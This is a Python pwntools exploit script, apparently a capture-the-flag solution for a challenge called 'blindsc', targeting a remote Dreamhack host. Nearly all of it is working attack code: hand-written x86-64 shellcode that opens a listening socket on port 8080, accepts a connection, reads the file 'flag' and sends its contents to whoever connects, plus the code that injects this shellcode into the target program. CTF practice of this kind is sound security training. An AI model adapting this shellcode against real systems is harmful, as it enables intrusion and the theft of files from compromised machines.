#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'
context.binary = elf = ELF('./blindsc', checksec=False)

#libc = ELF('', checksec=False)
libc = elf.libc

gs = """
b *main
b *main+615
c
c
si
"""

'''
After run, nc localhost 8080 to get flag
'''

info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)
rcu = lambda data: io.recvuntil(data)
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
        #return gdb.debug(elf.path, env={"LD_PRELOAD": libc.path}, gdbscript=gs)
    elif args.REMOTE:
        return remote('host3.dreamhack.games', 13101)
    else:
        return process(elf.path)
        #return process(elf.path, env={"LD_LIBRARY_PATH": libc.path})


shellcode = \
"""
/* socket(AF_INET, SOCK_STREAM, 0);*/
/* socket(2, 1, 0) */
xor rdi, rdi
xor rsi, rsi
xor rdx, rdx
mov dil, 2
mov sil, 1
xor rax, rax
mov al, 0x29
syscall

/* int opt = 1; setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt));*/
/* setsockopt(server_fd, 1, 0xf, &opt, sizeof(opt)) */
mov dword ptr [rbp - 12], 1
mov qword ptr [rbp - 8], rax
mov rdi, qword ptr [rbp - 8]
xor rsi, rsi
mov sil, 1
xor rdx, rdx
mov dl, 0xf
lea r10, [rbp - 12]
mov r8d, 4
xor rax, rax
mov al, 0x36
syscall

/* struct sockaddr_in address;  bind(server_fd, (struct sockaddr*)&address, sizeof(address)); */

/*prepare struct sockaddr */
xor rbx, rbx
mov ebx, 0x901f0002
mov qword ptr [rbp + 32], rbx
mov qword ptr [rbp + 32 + 8], 1
mov qword ptr [rbp + 32 + 16], 0
/* mov qword ptr [rbp + 32 + 24], 0 */

mov rdi, qword ptr [rbp - 8]
lea rsi, qword ptr [rbp + 32]
xor rdx, rdx
mov dl, 0x10
xor rax, rax
mov al, 0x31
syscall

/* listen(server_fd, 3); */
mov rdi, qword ptr [rbp - 8]
xor rsi, rsi
mov sil, 3
mov rax, 0x32
syscall

/* socklen_t addrlen = sizeof(address); accept(server_fd, (struct sockaddr*)&address, &addrlen); */

/*prepare addrlen */
mov rbx, 0x300000010
mov qword ptr [rbp + 24], rbx
mov rdi, qword ptr [rbp - 8]
lea rsi, qword ptr [rbp + 32]
lea rdx, dword ptr [rbp + 24]
mov rax, 0x2b
syscall

mov qword ptr [rbp + 8], rax

/* open("flag", 2) */
lea rdi, [rip + flag]
mov rsi, 2
mov rax, 2
syscall

/* read(fd, flag, 90); */
mov rdi, rax
mov rsi, rsp
mov rdx, 0x64
mov rax, 0
syscall

/* send(new_socket, flag, strlen(flag), 0); */
mov rdi, qword ptr [rbp + 8]
mov rsi, rsp
mov rdx, 0x64
xor r8, r8
xor r10, r10
mov rax, 0x2c
syscall
flag:
    .asciz "flag"
"""
payload = asm(shellcode)


io = start()
sla(b'Input shellcode: ', payload)
io.interactive()